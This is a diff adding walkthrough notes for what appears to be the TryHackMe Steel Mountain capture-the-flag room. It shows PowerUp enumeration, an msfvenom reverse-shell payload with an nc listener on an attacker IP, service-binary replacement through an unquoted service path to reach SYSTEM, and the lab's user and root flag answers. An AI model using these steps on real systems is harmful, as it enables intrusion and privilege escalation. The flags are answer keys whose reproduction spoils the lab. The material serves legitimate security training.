@@ -37,6 +37,37 @@ more user.txt
 
 b04763b6fcf51fcd7c13abc7db4fd365
 
+git clone https://github.com/PowerShellMafia/PowerSploit
+cd PowerSploit/Privis
+upload PowerUp.ps1
+Invoke-AllChecks
+
+
+- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+AdvancedSystemCareService9
+
+
+- What is the root flag?
+hint: On mymachine
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.88.227 LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+mv Advanced.exe ASCService.exe
+
+On other my machine 
+nc -lnvp 4443
+
+meterpreter>shell
+c:\sc stop AdvancedSystemCareService9
+Ctrl+Z
+meterpreter>cd "C:\Program Files (x86)\IObit\Advanced SystemCare>"
+meterpreter>upload ASCservice.exe
+meterpreter>shell
+sc start AdvancedSystemCareService9
+c:\windows\system32\
+whoami
+nt authority\system
+cd c:\Users\Administrator\Desktop
+more root.txt
+9af5f314f57607c00fd09803a587db80
 
 
 https://tryhackme.com/room/steelmountain
